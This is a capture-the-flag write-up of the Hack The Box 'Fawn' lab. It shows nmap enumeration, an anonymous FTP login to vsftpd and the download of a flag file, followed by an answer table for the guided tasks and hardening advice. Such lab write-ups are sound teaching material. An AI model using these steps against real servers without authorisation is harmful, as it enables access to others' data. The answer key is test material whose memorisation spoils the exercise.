# HTB Starting Point — "Fawn" (Linux)

**Category:** Starting Point (Tier 0)  
**Difficulty:** Very Easy  
**OS:** Linux  
**XP reward:** 150

---

## Challenge Description

Fawn is the third machine of the Hack The Box Starting Point track. It introduces **FTP (File Transfer Protocol)** and the risks of allowing **anonymous access** on a file server.

The machine is spawned as a target reachable through the VPN:

```text
<TARGET_IP>
```

> The IP changes every time the machine is respawned.

---

## Tooling

- `openvpn` — to connect to the HTB lab network
- `ping` — to test connectivity with the target
- `nmap` — to discover open ports and identify services and versions
- `ftp` — command-line client to interact with the FTP server

---

## Guided Questions (Tasks 1–11)

| Task | Question | Answer |
|------|----------|--------|
| 1 | What does the 3-letter acronym **FTP** stand for? | `File Transfer Protocol` |
| 2 | Which port does the FTP service usually listen on? | `21` |
| 3 | Secure protocol designed to provide similar functionality to FTP, as an extension of SSH? | `SFTP` |
| 4 | Command to send an ICMP echo request to test the connection? | `ping` |
| 5 | What version is FTP running on the target? | `vsftpd 3.0.3` |
| 6 | What OS type is running on the target? | `Unix` |
| 7 | Command to display the `ftp` client help menu? | `ftp -?` |
| 8 | Username used over FTP to log in without an account? | `anonymous` |
| 9 | Response code for the FTP message "Login successful"? | `230` |
| 10 | Other command (besides `dir`) to list files, common on Linux? | `ls` |
| 11 | Command used to download the file found on the FTP server? | `get` |

---

## Recon: Connecting to the Lab

Connect to the HTB network with the VPN configuration file downloaded from the platform (here, the *EU StartingPoint 2* server):

```bash
sudo openvpn starting_point_<username>.ovpn
```

Then check that the target is reachable:

```bash
ping -c 4 <TARGET_IP>
```

```text
64 bytes from <TARGET_IP>: icmp_seq=1 ttl=63 time=...
```

Replies come back, so the target is alive.

---

## Port Scanning

Scan the target with `nmap`, using default scripts (`-sC`) and version detection (`-sV`):

```bash
nmap -sC -sV <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
```

Key findings:

- Only one port is open: **21/tcp**, running **vsftpd 3.0.3**.
- The OS type is **Unix**.
- The `ftp-anon` script reports that **anonymous login is allowed**, and even lists a `flag.txt` file.

FTP is a protocol used to transfer files between a client and a server. It is **unencrypted** (credentials and data travel in clear text), which is why SFTP (over SSH) or FTPS is preferred.

---

## Gaining Access

Connect with the `ftp` client:

```bash
ftp <TARGET_IP>
```

```text
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.3)
Name (<TARGET_IP>:user):
```

FTP servers can be configured to accept the special username `anonymous`, usually with any (or no) password. Try it:

```text
Name (<TARGET_IP>:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

The server answers with the code **230 — Login successful**. We are in, without any valid account.

---

## Getting the Flag

List the files available on the server:

```text
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Download the file to the local machine with `get`:

```text
ftp> get flag.txt
local: flag.txt remote: flag.txt
226 Transfer complete.
32 bytes received.
ftp> bye
221 Goodbye.
```

Then read it locally:

```bash
cat flag.txt
```

```text
HTB{REDACTED}
```

Submit it in the **Submit Flag** field on the platform to own the machine.

---

## Takeaways

- **Anonymous FTP access is a common misconfiguration.** Unless a public file share is explicitly intended, anonymous login should be disabled.
- **FTP is unencrypted.** Usernames, passwords and file contents can be sniffed on the network. Prefer **SFTP** (SSH) or **FTPS** (FTP over TLS).
- **Service enumeration pays off.** A single `nmap -sC -sV` scan revealed the service version, the OS type, and the anonymous login, which was the entire path to the flag.
- **Exposed files can leak sensitive data.** Even a "harmless" FTP server can hold credentials, backups or configuration files, so its content should be reviewed and access restricted.
- **Hardening checklist:** disable anonymous login (`anonymous_enable=NO` in vsftpd), restrict access with a firewall, use encrypted protocols, and keep the service up to date.
